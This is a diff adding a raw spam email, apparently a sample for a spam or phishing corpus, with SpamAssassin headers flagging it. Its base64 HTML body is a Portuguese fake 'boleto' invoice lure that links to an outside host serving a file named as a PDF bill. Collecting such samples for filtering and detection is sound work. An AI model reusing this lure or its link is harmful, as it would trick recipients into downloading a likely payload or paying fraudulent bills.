@@ -1,0 +1,103 @@
+Return-Path: <root@cv18.engeseltrh.com>
+Delivered-To: contato+spam@ipbtoledo.com.br
+Received: from server.mundotk.com.br
+	by server.mundotk.com.br with LMTP
+	id CFmnHzx4RGHTCAAA85qOww
+	(envelope-from <root@cv18.engeseltrh.com>)
+	for <contato+spam@ipbtoledo.com.br>; Fri, 17 Sep 2021 08:13:00 -0300
+Return-path: <root@cv18.engeseltrh.com>
+Envelope-to: contato@ipbtoledo.com.br
+Delivery-date: Fri, 17 Sep 2021 08:13:00 -0300
+Received: from cv18.engeseltrh.com ([83.229.14.168]:43387)
+	by server.mundotk.com.br with esmtp (Exim 4.94.2)
+	(envelope-from <root@cv18.engeseltrh.com>)
+	id 1mRBnb-0000gQ-Lq
+	for contato@ipbtoledo.com.br; Fri, 17 Sep 2021 08:13:00 -0300
+Received: by cv18.engeseltrh.com (Postfix, from userid 0)
+	id 38799100C85; Fri, 17 Sep 2021 10:55:24 +0000 (UTC)
+MIME-Version: 1.0
+Content-type:  text/html; charset=UTF-8
+Content-Transfer-Encoding: base64
+From: Boleto Disponivel<contato@acessofinanceiro.com.br>
+To: contato@ipbtoledo.com.br
+Message-Id: <20210917105524.38799100C85@cv18.engeseltrh.com>
+Date: Fri, 17 Sep 2021 10:55:24 +0000 (UTC)
+X-Spam-Status: Yes, score=10.2
+X-Spam-Score: 102
+X-Spam-Bar: ++++++++++
+X-Spam-Report: Spam detection software, running on the system "server.mundotk.com.br",
+ has identified this incoming email as possible spam.  The original
+ message has been attached to this so you can view it or label
+ similar future email.  If you have any questions, see
+ root\@localhost for details.
+ Content preview:  boleto Prezado Cliente(a), Segue conforme solicitado! 
+ Content analysis details:   (10.2 points, 5.0 required)
+  pts rule name              description
+ ---- ---------------------- --------------------------------------------------
+  0.2 HEADER_FROM_DIFFERENT_DOMAINS From and EnvelopeFrom 2nd level
+                             mail domains are different
+  0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was
+                             blocked.  See
+                             http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
+                              for more information.
+                             [URIs: kgmcompressores.com]
+  0.8 DKIM_ADSP_NXDOMAIN     No valid author signature and domain not in
+                             DNS
+  0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
+  0.0 HTML_MESSAGE           BODY: HTML included in message
+  2.4 RAZOR2_CF_RANGE_51_100 Razor2 gives confidence level above 50%
+                             [cf: 100]
+  1.7 RAZOR2_CHECK           Listed in Razor2 (http://razor.sf.net/)
+  0.8 CPANEL_LOTS_OF_EMPTY_LINE RAW: Spam that has large block of
+                             empty lines
+  0.0 T_KAM_HTML_FONT_INVALID Test for Invalidly Named or Formatted
+                             Colors in HTML
+  0.5 KAM_NUMSUBJECT         Subject ends in numbers excluding current years
+  1.0 KAM_LAZY_DOMAIN_SECURITY Sending domain does not have any
+                             anti-forgery methods
+  2.6 FSL_BULK_SIG           Bulk signature with no Unsubscribe
+X-Spam-Flag: YES
+Subject:    Segue Sua Fatura Digital: Setembro/2021
+
+PCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFs
+Ly9FTiI+DQoKPGh0bWw+DQoKPGhlYWQ+DQoKDQoKDQoKDQoKDQoKICANCgogIA0KCiAgDQoKICA8
+bWV0YSBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSIgaHR0cC1lcXVpdj0i
+Y29udGVudC10eXBlIj4NCgoNCgoNCgoNCgogIA0KCiAgDQoKICANCgogIDx0aXRsZT5ib2xldG88
+L3RpdGxlPg0KCjwvaGVhZD4NCgoNCgoNCgo8Ym9keT4NCgoNCgoNCgoNCgoNCgo8ZGl2IHN0eWxl
+PSJwYWRkaW5nOiA5cHg7IGNvbG9yOiByZ2IoNDQsIDU0LCA1OCk7IGZvbnQtZmFtaWx5OiBSb2Jv
+dG8sc2Fucy1zZXJpZjsgZm9udC1zdHlsZTogbm9ybWFsOyBsZXR0ZXItc3BhY2luZzogbm9ybWFs
+OyBvcnBoYW5zOiAyOyB0ZXh0LWluZGVudDogMHB4OyB3aGl0ZS1zcGFjZTogbm9ybWFsOyB3aWRv
+d3M6IDI7IHdvcmQtc3BhY2luZzogMHB4OyBmb250LXNpemU6IDE2cHg7IGZvbnQtd2VpZ2h0OiBi
+b2xkOyB0ZXh0LXRyYW5zZm9ybTogdXBwZXJjYXNlOyB0ZXh0LWFsaWduOiBsZWZ0OyI+PHNwYW4g
+c3R5bGU9ImZvbnQtZmFtaWx5OiBhcmlhbCxzYW5zLXNlcmlmOyBjb2xvcjogcmdiKDAsIDAsIDAp
+OyI+PGJyPg0KCjwvc3Bhbj48c3BhbiBzdHlsZT0iY29sb3I6IHJnYig0NCwgNTQsIDU4KTsgZm9u
+dC1zaXplOiAxNHB4OyBmb250LXN0eWxlOiBub3JtYWw7IGZvbnQtd2VpZ2h0OiA0MDA7IGxldHRl
+ci1zcGFjaW5nOiBub3JtYWw7IG9ycGhhbnM6IDI7IHRleHQtYWxpZ246IGxlZnQ7IHRleHQtaW5k
+ZW50OiAwcHg7IHRleHQtdHJhbnNmb3JtOiBub25lOyB3aGl0ZS1zcGFjZTogbm9ybWFsOyB3aWRv
+d3M6IDI7IHdvcmQtc3BhY2luZzogMHB4OyBiYWNrZ3JvdW5kLWNvbG9yOiByZ2IoMjU1LCAyNTUs
+IDI1NSk7IGRpc3BsYXk6IGlubGluZSAhIGltcG9ydGFudDsgZmxvYXQ6IG5vbmU7IGZvbnQtZmFt
+aWx5OiBIZWx2ZXRpY2EsQXJpYWwsc2Fucy1zZXJpZjsiPiZuYnNwOzxicj4NCgoNCgoNCgoNCgoN
+Cgo8L3NwYW4+DQoKPGJpZz48c3BhbiBzdHlsZT0iY29sb3I6IHJnYig0NCwgNTQsIDU4KTsgZm9u
+dC1mYW1pbHk6IFJvYm90byxzYW5zLXNlcmlmOyBmb250LXNpemU6IDE0cHg7IGZvbnQtc3R5bGU6
+IG5vcm1hbDsgZm9udC13ZWlnaHQ6IDQwMDsgbGV0dGVyLXNwYWNpbmc6IG5vcm1hbDsgb3JwaGFu
+czogMjsgdGV4dC1hbGlnbjogbGVmdDsgdGV4dC1pbmRlbnQ6IDBweDsgdGV4dC10cmFuc2Zvcm06
+IG5vbmU7IHdoaXRlLXNwYWNlOiBub3JtYWw7IHdpZG93czogMjsgd29yZC1zcGFjaW5nOiAwcHg7
+IGJhY2tncm91bmQtY29sb3I6IHJnYigyNTUsIDI1NSwgMjU1KTsgZGlzcGxheTogaW5saW5lICEg
+aW1wb3J0YW50OyBmbG9hdDogbm9uZTsiPlByZXphZG8gQ2xpZW50ZShhKSw8YnI+DQoKPGJyPg0K
+Cg0KCg0KClNlZ3VlDQoKY29uZm9ybWUgc29saWNpdGFkbyE8L3NwYW4+PC9iaWc+PGJyPg0KCg0K
+Cg0KCg0KCg0KCjxicj4NCgoNCgoNCgoNCgoNCgpCT0xFVE8NCgooIE0mRWNpcmM7UyAwOSk8YnI+
+DQoKDQoKDQoKDQoKDQoKPGJyPg0KCg0KCg0KCg0KCg0KCjwvZGl2Pg0KCg0KCg0KCg0KCg0KCjxw
+IHN0eWxlPSJtYXJnaW4tdG9wOiAwcHg7IGNvbG9yOiByZ2IoNDQsIDU0LCA1OCk7IGZvbnQtZmFt
+aWx5OiBSb2JvdG8sc2Fucy1zZXJpZjsgZm9udC1zaXplOiAxNHB4OyBmb250LXN0eWxlOiBub3Jt
+YWw7IGxldHRlci1zcGFjaW5nOiBub3JtYWw7IG9ycGhhbnM6IDI7IHRleHQtYWxpZ246IGxlZnQ7
+IHRleHQtaW5kZW50OiAwcHg7IHRleHQtdHJhbnNmb3JtOiBub25lOyB3aGl0ZS1zcGFjZTogbm9y
+bWFsOyB3aWRvd3M6IDI7IHdvcmQtc3BhY2luZzogMHB4OyI+PGJpZz48YSBocmVmPSJodHRwOi8v
+a2dtY29tcHJlc3NvcmVzLmNvbS9jZW50cmhvP0FOZDlHY1JDSExHVEIzcno1cmpFYXo4cnJlcEJ1
+SjR5cHJUMEJQUE4zd0YtQmFjTzh4M1IwVHR0P3Y9MTkyNzZjNTByRjMzRDlkZEo5RDRXcTl6V3NK
+MkQ3LzA5S1I5RERYWTNILzU2NzIyNi5CT0xFVE8uUERGIiB0YXJnZXQ9Il9ibGFuayIgcmVsPSJu
+b3JlZmVycmVyIiBzdHlsZT0iY29sb3I6IHJnYigwLCAxNzIsIDI1NSk7IHRleHQtZGVjb3JhdGlv
+bjogbm9uZTsgYmFja2dyb3VuZC1jb2xvcjogdHJhbnNwYXJlbnQ7Ij48c3BhbiBzdHlsZT0iZm9u
+dC13ZWlnaHQ6IGJvbGQ7Ij5DPC9zcGFuPmxpcXVlIEFxdWkgUGFyYSBJbXByaW1pciZuYnNwO0JP
+TEVUTzwvYT48L2JpZz48L3A+DQoKDQoKDQoKDQoKDQoKPC9ib2R5Pg0KCjwvaHRtbD4NCg==
+
+
